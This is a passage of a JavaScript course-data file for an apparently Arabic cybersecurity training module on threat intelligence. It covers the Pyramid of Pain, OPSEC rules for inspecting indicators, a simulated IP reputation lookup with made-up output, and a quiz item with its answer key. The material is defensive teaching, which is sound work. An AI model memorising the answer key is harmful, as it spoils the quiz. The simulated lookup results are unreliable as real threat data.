      <tr><td><strong>الطبقة 3</strong></td><td>أسماء النطاقات (Domain Names)</td><td>بسيط لمتوسط (Simple)؛ شراء نطاق بديل بـ 5 دولارات.</td><td>تكلفة بسيطة لتسجيل دومين جديد.</td></tr>
      <tr><td><strong>الطبقة 4</strong></td><td>مؤشرات الشبكة والنظام (Network/Host Artifacts)</td><td>متوسط الصعوبة (Annoying)؛ مثل ترويسات الـ C2 ومفاتيح الريجستري.</td><td>إزعاج للمهاجم واضطراره لتعديل إعدادات أدواته.</td></tr>
      <tr><td><strong>الطبقة 5</strong></td><td>الأدوات والبرمجيات (Tools)</td><td>صعب (Challenging)؛ مثل كشف برنامج Mimikatz أو Cobalt Strike.</td><td>يجبر المهاجم على برمجة أو شراء أداة اختراق جديدة كلياً!</td></tr>
      <tr><td><strong>قمة الهرم</strong></td><td>التكتيكات والتقنيات (TTPs)</td><td>قاسٍ ومؤلم للغاية (Tough)؛ طريقة تفكير المهاجم وسلوكه التدريبي.</td><td>أقصى درجات الألم؛ يجبر عصابة القرصنة على إعادة تدريب عناصرها لشهور!</td></tr>
    </tbody>
  </table>
</div>

<h4>قواعد الـ OPSEC الذهبية عند فحص الـ IOCs (Operational Security):</h4>
<ul>
  <li><strong>إياك ورفع ملفات سرية أو حزم بيانات تحتوي على أسرار الشركة لـ VirusTotal العام:</strong> لأن كل الملفات المرفوعة تصبح متاحة لآلاف الباحثين والمهاجمين حول العالم! افحص الهاش فقط بدلاً من رفع الملف الكامل.</li>
  <li><strong>إياك والنقر المباشر على روابط التصيد المشبوهة من متصفحك الشخصي:</strong> استخدم بيئات العزل السحابية (Sandboxes مثل Any.Run أو URLScan.io) لفتح الرابط في بيئة معزولة بأمان.</li>
  <li><strong>تشويه الروابط المشبوهة (Defanging):</strong> استبدال النقاط بأقواس مثل: <code>http[:]//evil-domain[.]com</code> لمنع الموظفين أو الزملاء من النقر عليها بالخطأ.</li>
</ul>
`,
        labAr: `
<div class="lab-box">
  <div class="lab-header">
    <span class="lab-tag">💻 محاكي فحص استخبارات التهديدات (OSINT Investigation Lab)</span>
    <h4>استعلام مؤشرات الـ IOC المشبوهة على منصات استخبارات التهديد</h4>
  </div>
  <p>شاهد استعلام فحص عنوان IP مشبوه عبر قاعدة بيانات AbuseIPDB:</p>
  <div class="terminal-mini">
    <div class="terminal-bar"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> osint-threat-checker</div>
    <pre class="terminal-code">QUERY TARGET: 198.51.100.44
AbuseIPDB Confidence Score: 100% (MALICIOUS)
Reports: 842 distinct security reports in last 24 hours
Categories: SSH Brute-Force, Web Scanning, Cobalt Strike C2 Node
Country: RU (Autonomous System: AS9120 BadActor_Hosting)
[RECOMMENDED SOC ACTION]: Permanent IP Block on Corporate Perimeter Firewalls!</pre>
  </div>
  <div class="lab-actions" style="margin-top: 1rem;">
    <button class="btn-cmd" onclick="runSimCommand('osint-lookup --ip 198.51.100.44', 'standalone-term-body'); app.showToast('تم فحص العنوان في قواعد استخبارات التهديدات', 'info');">فحص العنوان عبر واجهة OSINT</button>
  </div>
</div>
`,
        quiz: {
          questionAr: "في نموذج 'هرم الألم' (Pyramid of Pain)، أي مستوى من مؤشرات التهديد يسبب أقصى درجات الألم والإرهاق للمهاجمين عند نجاح فريق الـ SOC في كشفه وحظره؟",
          questionEn: "In the Pyramid of Pain, which level causes the most pain to adversaries?",
          optionsAr: [
            "مستوى التكتيكات والتقنيات والإجراءات (TTPs) في قمة الهرم",
            "مستوى هاشات الملفات (Hash Values) في قاعدة الهرم",
            "مستوى عناوين الـ IP المؤقتة",
            "مستوى لون خلفية شاشة الضحية"
          ],
          optionsEn: [
            "TTPs (Tactics, Techniques & Procedures) at the apex",
            "Hash Values at the base",
            "Temporary IP addresses",
            "Desktop wallpaper color"
          ],
          correctIndex: 0,
          explanationAr: "التكتيكات والتقنيات (TTPs) تمثل الطريقة المتأصلة التي يتدرب بها المهاجم وينفذ بها عملياته؛ وحرمان المهاجم من أسلوبه يجبره على التراجع وإعادة تدريب فريقه البرمجي والهجومي لشهور طويلة."
        }
      }
    ]
  },
];
